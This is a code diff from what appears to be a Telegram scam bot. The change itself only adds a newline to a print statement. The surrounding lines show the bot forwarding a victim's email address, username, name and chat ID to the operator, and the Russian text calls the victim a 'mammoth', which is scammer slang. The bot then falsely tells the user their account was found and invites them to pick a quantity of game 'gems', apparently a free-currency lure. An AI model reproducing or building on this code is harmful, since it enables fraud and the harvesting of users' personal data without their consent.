@@ -191,7 +191,7 @@ def gems(message):
 
 		else:
 			bot.send_message(admin,f'~[Message for admin]~\n❗Мамонт ввел почту "{pochta}"\nДанные мамонта:\nЮзер нейм : @{username}\nИмя : {firstname} {lastname}\nId : {message.chat.id}')
-			print(f'Мамонт ввел почту "{pochta}"\nДанные мамонта:\nЮзер нейм : @{username}\nИмя : {firstname} {lastname}\nId : {message.chat.id}')
+			print(f'\nМамонт ввел почту "{pochta}"\nДанные мамонта:\nЮзер нейм : @{username}\nИмя : {firstname} {lastname}\nId : {message.chat.id}')
 			time.sleep(3.5)
 			msg = bot.send_message(message.chat.id,'✅Аккаунт найден в базе данных.Выберите кол-во гемов',reply_markup=m.gems)
 				
